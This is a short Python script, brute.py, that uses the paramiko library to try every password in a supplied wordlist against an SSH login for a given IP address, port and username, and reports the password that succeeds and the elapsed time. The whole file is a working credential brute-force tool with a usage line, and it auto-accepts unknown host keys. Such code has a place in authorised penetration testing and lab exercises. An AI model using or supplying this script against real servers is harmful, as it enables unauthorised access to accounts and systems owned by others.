import paramiko
import sys
import os
import time
def menu():
  os.system('clear')
  print("""
  Usage:
          brute.py [ip address] [port] [username] [pass file]
  """)

start = time.time()
try:
  ip_addr = sys.argv[1]
  port = sys.argv[2]
  username = sys.argv[3]
  file_name = sys.argv[4]
except:
  print("No arg provided")
  menu()

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
  with open(file_name, 'r') as f:
    for lines in f.readlines():
      password = lines.strip()
      try:
        ssh.connect(ip_addr, port, username, password)
        print("connected as ", password)
        break
      except:
        pass
except:
  print('file name was incorret')
stop = time.time()

print("[*] time taken ",stop-start, "s")
